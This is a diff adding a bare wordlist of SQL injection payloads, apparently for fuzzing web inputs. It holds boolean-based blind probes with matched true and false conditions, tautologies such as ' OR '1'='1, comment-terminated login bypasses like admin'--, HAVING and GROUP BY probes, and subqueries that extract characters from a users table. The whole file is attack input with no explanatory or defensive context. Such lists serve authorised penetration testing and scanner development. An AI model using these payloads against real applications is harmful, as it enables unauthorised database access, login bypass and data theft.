@@ -1,0 +1,28 @@
+' AND '1'='1
+' AND '1'='2
+' AND 1=1--
+' AND 1=2--
+" AND 1=1--
+" AND 1=2--
+' OR '1'='1
+' OR '1'='2
+1 AND 1=1
+1 AND 1=2
+1' AND 1=1 AND '1'='1
+1' AND 1=2 AND '1'='1
+' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND (SELECT COUNT(*) FROM users)=0--
+true
+false
+1
+0
+-1
+' OR 1=1--
+' OR 1=2--
+admin'--
+admin' #
+admin'/*
+' HAVING 1=1--
+' HAVING 1=2--
+' GROUP BY 1--
